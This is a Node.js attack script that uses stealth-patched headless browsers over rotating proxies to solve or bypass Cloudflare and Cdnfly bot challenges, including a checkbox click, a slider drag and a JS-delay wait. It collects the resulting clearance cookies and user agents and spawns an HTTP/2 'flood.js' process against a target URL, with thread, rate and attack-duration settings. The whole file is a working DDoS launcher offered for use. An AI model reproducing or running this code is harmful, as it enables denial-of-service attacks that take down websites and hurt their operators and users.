/*
rm -rf node_modules
npm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth async
sudo apt update -y && sudo apt install ca-certificates fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgbm1 libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 lsb-release wget xdg-utils -y
npm i net fs url hpack path colors child_process http2 random-referer request axios tls crypto header-generator user-agents cluster fake-useragent randomstring string-random puppeteer puppeteer-extra puppeteer-extra-plugin-stealth async hpack
*/
const errorHandler = error => {
  //console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (item) {
 const index = this.indexOf(item);
 if (index !== -1) {
   this.splice(index, 1);
 }
 return item;
}
function spawnHttp2Process(url, userAgent, time, cookie, thread, proxy) {
   const args = [url, userAgent, time, cookie, rates, proxy];
   const http2Process = spawn("node", [
                   "flood.js",
                   url,
                   "30",
                   "15",
                   proxy,
                   rates,
                   cookie,
                   userAgent
               ]);
   http2Process.stdout.on('data', (data) => {
   });
   http2Process.stderr.on('data', (data) => {
   });
}

const COOKIES_MAX_RETRIES = 1;
const async = require("async");
const fs = require("fs");
const request = require("request");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const stealthPlugin = puppeteerStealth();

puppeteer.use(stealthPlugin);
const targetURL = process.argv[2];
const threads = +process.argv[3];
const proxyFile = process.argv[4];
const fileContent = fs.readFileSync(proxyFile, 'utf8');
const proxiesCount = fileContent.split('\n').length;
const rates = process.argv[5];
const duration = process.argv[6];
const attackDuration = process.argv[7];
const isFlood = process.argv[8];
let floodMode;
if (isFlood === 'true') {
 floodMode = "(flooder enable)";
} else if (isFlood === 'false') {
 floodMode = "(flooder disable)";
} else {
 process.exit(1);
}
let challengeCount = 0;
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(proxyFile);
const colors = {
 COLOR_RED: "\x1b[31m",
 COLOR_GREEN: "\x1b[32m",
 COLOR_YELLOW: "\x1b[33m",
 COLOR_RESET: "\x1b[0m",
 COLOR_PURPLE: "\x1b[35m",
 COLOR_CYAN: "\x1b[36m",
 COLOR_BLUE: "\x1b[34m",
};
const { spawn } = require("child_process");
function colored(colorCode, text) {
 console.log(colorCode + text + colors.COLOR_RESET);
};
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
const nodeii = getRandomInt(120, 126);
function get_option(flag) {
  const index = process.argv.indexOf(flag);
  return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}
function getCurrentTime() {
  const now = new Date();
  const hours = now.getHours().toString().padStart(2, '0');
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const seconds = now.getSeconds().toString().padStart(2, '0');
  return `${hours}:${minutes}:${seconds}`;
}
const options = [
  { flag: '--fin', value: get_option('--fin') },
  { flag: '--static', value: get_option('--static') }
];
function enabled(buf) {
  var flag = `--${buf}`;
  const option = options.find(option => option.flag === flag);

  if (option === undefined) { return false; }

  const optionValue = option.value;

  if (optionValue === "true" || optionValue === true) {
      return true;
  } else if (optionValue === "false" || optionValue === false) {
      return false;
  } else if (!isNaN(optionValue)) {
      return parseInt(optionValue);
  } else {
      return false;
  }
}
function check_proxy(proxy) {
 return new Promise((resolve, reject) => {
   request({
     url: "https://google.com",
     proxy: "http://" + proxy,
     headers: {
       'User-Agent': "curl/7.58.0",
     }
   }, (err, res, body) => {
     if (!err && res.statusCode === 200) {
       resolve(proxy);
     } else {
       reject();
     }
   });
 });
}
async function isProxyValid(browserProxy) {
 try {
   await check_proxy(browserProxy);
   return browserProxy;
 } catch (error) {
   throw new Error();
 }
}
async function detectChallenge(browserProxy, page) {
 const title = await page.title();
 const content = await page.content();
 if (title === "Attention Required! | Cloudflare") {
   throw new Error("Proxy blocked");
 }

 if (content.includes("challenge-platform")) {
   colored(colors.COLOR_PURPLE, "[PUPPETEER] Found CloudFlare challenge " + browserProxy);
   try {
     await sleep(25);
     const captchaContainer = await page.$(".spacer > div:first-child");
     if (captchaContainer) {
       const { x, y } = await captchaContainer.boundingBox();
       await page.mouse.click(x + 20, y + 20);
     } else if (enabled('static')) {
      await page.waitForFunction('window.__CF$cv$params');
      await page.waitForFunction(() => document.querySelector('script[src*="main.js"]') !== null);
      await page.setRequestInterception(true);
     }
   } finally {
     await sleep(15);
     return;
   }
 }

 if (content.includes("/_guard/html.js?js=click_html") === true) {
   colored(colors.COLOR_PURPLE, "[+] Found Cdnfly Click challenge " + browserProxy);
   try {
     maxAttempts = 3;
     index = 0;
     while (index < maxAttempts) {
       await page.waitForSelector('.main #access', { visible: true, timeout: 30000 });
       await page.click('.main #access');
       const content = await page.content();
       if (content.includes("/_guard/html.js") === false) {
         break;
       }
       index++;
     }
   } finally {
     await sleep(10);
     return;
   }
 }

 if (content.includes("/_guard/html.js?js=delay_jump_html") === true) {
   colored(colors.COLOR_PURPLE, "[+] Found Cdnfly JS challenge " + browserProxy);
   try {
     maxAttempts = 3;
     index = 0;
     while (index < maxAttempts) {
       await sleep(20);
       const content = await page.content();
       if (content.includes("/_guard/html.js") === false) {
         break;
       }
       index++;
     }
   } finally {
     return;
   }
 }

 if (content.includes("/_guard/html.js?js=slider_html") === true) {
   colored(colors.COLOR_PURPLE, "[+] Found Cdnfly Slide challenge " + browserProxy);
   try {
     maxAttempts = 3;
     index = 0;
     while (index < maxAttempts) {
       await page.waitForSelector('#slider', { visible: true, timeout: 30000 });
       const sliderElement = await page.$('#slider');
       const sliderBoundingBox = await sliderElement.boundingBox();
       await sliderElement.click();
       const randomOffset = Math.random() * 10 + 10;
       await page.mouse.move(sliderBoundingBox.x + randomOffset, sliderBoundingBox.y);
       await page.mouse.down();
       for (let i = 0; i < 20; i++) {
           await page.mouse.move(sliderBoundingBox.x + (i * sliderBoundingBox.width / 20), sliderBoundingBox.y);
   await sleep(Math.random() * 0.1 + 0.05);
       }
       await page.mouse.up();
       await sleep(Math.random() * 5 + 3);
       const content = await page.content();
       if (content.includes("/_guard/html.js") === false) {
         break;
       }
       index++;
     }
   } finally {
     return;
   }
 }

 colored(colors.COLOR_PURPLE, "[+] No challenge detected " + browserProxy);
 await sleep(15);
 return;
}
async function openBrowser(targetURL, browserProxy) {
 const userAgents = [
   `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36`,
   `Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36`,
   `Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.5993.65 Mobile Safari/537.36`,
   `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/${nodeii}.0.5993.69 Mobile/15E148 Safari/604.1`,
   `Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53`
 ];
 const randomIndex = Math.floor(Math.random() * userAgents.length);
 const randomUA = userAgents[randomIndex];
 const promise = async (resolve, reject) => {
   const options = {
     headless: "new",
     devtools: true,
     ignoreHTTPSErrors: true,
     args: [
       "--proxy-server=http://" + browserProxy,
       '--start-maximized',
       '--disable-blink-features=AutomationControlled',
       '--disable-features=IsolateOrigins,site-per-process',
       '--use-fake-device-for-media-stream',
       '--use-fake-ui-for-media-stream',
       '--disable-dev-shm-usage',
       '--disable-software-rasterizer',
       '--enable-features=NetworkService',
       '--no-sandbox',
       '--test-type',
       '--ignore-certificate-errors',
       '--ignore-certificate-errors-spki-list',
       '--ignore-certificate-errors-cert-authority',
       '--disable-popup-blocking',
       "--user-agent="
       + randomUA
     ]
   };
   const browser = await puppeteer.launch(options);
   try {
     colored(colors.COLOR_YELLOW, "[PUPPETEER] Started browser " + browserProxy);
     const [page] = await browser.pages();
     const client = page._client();
     page.on("framenavigated", (frame) => {
       if (frame.url().includes("challenges.cloudflare.com") === true) client.send("Target.detachFromTarget", { targetId: frame._id });
     });
     page.setDefaultNavigationTimeout(60 * 1000);
     await page.setJavaScriptEnabled(true);
     const userAgent = await page.evaluate(function () {
       return navigator.userAgent;
     });
     let fingerprint;
     if (enabled('fin')) {
     console.log("STARTING USING FINGERPRINT ...");
     fingerprint = await plugin.fetch('', { tags: ['Microsoft Windows', 'Chrome'] });
      plugin.useFingerprint(fingerprint);
      const dimensions = await page.evaluate(() => ({
        deviceScaleFactor: window.devicePixelRatio,
        width: document.documentElement.clientWidth,
        height: document.documentElement.clientHeight,
      }));
    }
     await page.goto(targetURL, {
       waitUntil: "domcontentloaded"
     });
     await detectChallenge(browserProxy, page, reject);
     const title = await page.title();
     const cookies = await page.cookies(targetURL);
     resolve({
       title: title,
       browserProxy: browserProxy,
       cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
       userAgent: userAgent,
       content: await page.content()
     });
   } catch (exception) {
     reject("[PUPPETEER] Error when solving challenge " + browserProxy);
   } finally {
     colored(colors.COLOR_RESET, "[PUPPETEER] Closed browser " + browserProxy);
     await browser.close();
   }
 };
 return new Promise(promise);
}
async function startThread(targetURL, browserProxy, task, done, retries = 0) {
 if (retries === COOKIES_MAX_RETRIES) {
   const currentTask = queue.length();
   done(null, { task, currentTask });
 } else {
   try {
     const response = await openBrowser(targetURL, browserProxy);
     //if (1) {
     if (response.content.includes("challenge-platform") === false && (!response.cookies.includes("cf_chl") || (response.cookies.includes("cf_chl") && response.cookies.length > 32))) {
       challengeCount++;
       
       
       const currentTime = getCurrentTime();
       
       const cookies = `\n${colors.COLOR_BLUE}(${currentTime})${colors.COLOR_RESET} [PUPPETEER] | ${colors.COLOR_PURPLE}(${response.browserProxy})${colors.COLOR_RESET} | User Agent: ${colors.COLOR_YELLOW}${response.userAgent}${colors.COLOR_RESET} | Cookie: ${colors.COLOR_GREEN}${response.cookies}${colors.COLOR_RESET}`;
       colored(colors.COLOR_RESET,cookies);
       
       
       
       if (isFlood === 'true') {
           await spawnHttp2Process(targetURL, response.userAgent, duration, response.cookies, rates, response.browserProxy);
       }
     } else {
       colored(colors.COLOR_RED, "[CRISX] Fail to solve challenge");
     }
     await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
   } catch (exception) {
     colored(colors.COLOR_RED, exception);
     await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
   }
 }
}


var queue = async.queue(function (task, done) {
  startThread(targetURL, task.browserProxy, task, done);
}, threads);

async function __main__() {
  const queueDrainHandler = () => { };
  queue.drain(queueDrainHandler);
  for (let i = 0; i < proxiesCount; i++) {
    const browserProxy = randList(proxies);
    proxies.remove(browserProxy);
    isProxyValid(browserProxy)
    .then(browserProxy => {
      queue.unshift({ browserProxy: browserProxy });
      colored(colors.COLOR_BLUE, "[+] Selected proxy " + browserProxy);
    })
    .catch(error => {
    });
  }
}

__main__();

setTimeout(function(){
   process.exit();
}, process.argv[7] * 1000);
